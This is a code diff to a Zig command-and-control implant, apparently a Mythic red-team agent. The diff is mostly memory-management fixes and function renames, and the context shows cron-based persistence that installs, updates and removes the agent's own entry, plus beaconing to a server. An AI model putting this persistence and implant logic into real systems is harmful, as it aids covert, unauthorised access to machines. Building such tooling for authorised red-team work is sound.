@@ -75,6 +75,7 @@ pub const MythicAgent = struct {
         self.tasks.deinit(self.allocator);
         self.pending_responses.deinit(self.allocator);
         self.network_client.deinit();
+        self.allocator.free(self.payload_uuid);
     }
 
     pub fn run(self: *Self) !void {
@@ -100,15 +101,16 @@ pub const MythicAgent = struct {
         } else {
             // Here is where we should check if a cron job exists for this exepath
             // If it doesn't, we install one
-            const cron_exists = try PersistUtils.get_cron_entries(self.allocator, self.io);
+            const cron_exists = try PersistUtils.getCronEntries(self.allocator, self.io);
             if (cron_exists == null or cron_exists.?.len == 0) {
-                PersistUtils.install_cron(exepath, self.allocator, self.io) catch |err| {
+                PersistUtils.installCron(exepath, self.allocator, self.io) catch |err| {
                     std.debug.print("{}", .{err});
                 };
             } else {
                 const cron_path = cron_exists.?;
+                defer self.allocator.free(cron_path);
                 if (!std.mem.eql(u8, cron_path, exepath)) {
-                    PersistUtils.update_cron_entry(cron_path, exepath, self.allocator, self.io) catch |err| {
+                    PersistUtils.updateCronEntry(cron_path, exepath, self.allocator, self.io) catch |err| {
                         std.debug.print("{}", .{err});
                     };
                 } else {
@@ -123,7 +125,7 @@ pub const MythicAgent = struct {
                     const exe_path = try std.process.executablePathAlloc(self.io, self.allocator);
                     defer self.allocator.free(exe_path);
 
-                    PersistUtils.remove_cron_entry(exe_path, self.allocator, self.io) catch |err| {
+                    PersistUtils.removeCronEntry(exe_path, self.allocator, self.io) catch |err| {
                         print("{}", .{err});
                     };
 
@@ -143,6 +145,12 @@ pub const MythicAgent = struct {
             self.sendResponses() catch |err| {
                 print("{}", .{err});
             };
+
+            for (self.tasks.items) |*task| {
+                task.deinit(self.allocator);
+            }
+
+            self.tasks.clearRetainingCapacity();
 
             try self.sleep();
         }
@@ -320,7 +328,7 @@ pub const MythicAgent = struct {
                     self.is_running = false;
                     const exit_response = MythicResponse{
                         .task_id = task.id,
-                        .user_output = "Agent terminating...",
+                        .user_output = try self.allocator.dupe(u8, "Agent terminating..."),
                         .completed = true,
                         .status = "completed",
                     };
@@ -398,7 +406,11 @@ pub const MythicAgent = struct {
         const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
 
-        self.pending_responses.clearAndFree(self.allocator);
+        for (self.pending_responses.items) |*response| {
+            response.deinit(self.allocator);
+        }
+
+        self.pending_responses.clearRetainingCapacity();
     }
 
     fn sleep(self: *Self) !void {
